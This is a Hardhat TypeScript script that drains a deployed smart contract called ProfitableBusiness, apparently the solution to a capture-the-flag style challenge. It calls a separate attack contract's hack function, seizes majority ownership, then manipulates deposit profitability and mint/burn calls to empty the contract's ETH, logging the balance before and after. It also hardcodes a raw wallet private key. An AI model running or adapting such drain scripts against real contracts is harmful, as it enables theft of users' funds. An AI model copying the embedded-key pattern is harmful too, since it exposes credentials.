import { ethers } from 'hardhat'
import { BigNumber } from 'ethers'
import { ProfitableBusinessAttack__factory, ProfitableBusiness__factory } from '../typechain'
import { ETH_RPC } from '../secrets.config'

import * as dotenv from 'dotenv'
import { BNToNumstr } from '../gotbit-tools/hardhat/extensions/bignumber'
dotenv.config()

const mmmAddr = "0xBF1b26Dd3C4Aa640335c87AA6658A5aF362155b3"
const attackAddr = "0x96e1bc501FbBb273f61FFC27BDeb8d644fD43245"

const providerETH = new ethers.providers.JsonRpcProvider(ETH_RPC)

async function eth() {
  const signer = new ethers.Wallet("1d601a181721b4ee6e2c40ea05ff6b53e4efc35f584c39c5e004cc8a328c5c45", providerETH);
  const mmmContract = ProfitableBusiness__factory.connect(mmmAddr, signer)
  console.log("bb:", BNToNumstr(await providerETH.getBalance(mmmAddr), 18, 18));
  
  const attackContract = ProfitableBusinessAttack__factory.connect(attackAddr, signer)
  await (await attackContract.hack(mmmAddr)).wait()

  await (await mmmContract.changeMajorityOwner()).wait()
  await (await mmmContract.enhanceDepositProfitability(BigNumber.from(10).pow(18), 1)).wait()
  await (await mmmContract.mint({value: 1})).wait()
  await (await mmmContract.burn(BigNumber.from(10).pow(8).add(BigNumber.from(10).pow(15)).add(1))).wait()
  console.log("ba:", BNToNumstr(await providerETH.getBalance(mmmAddr), 18, 18));
}

eth()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })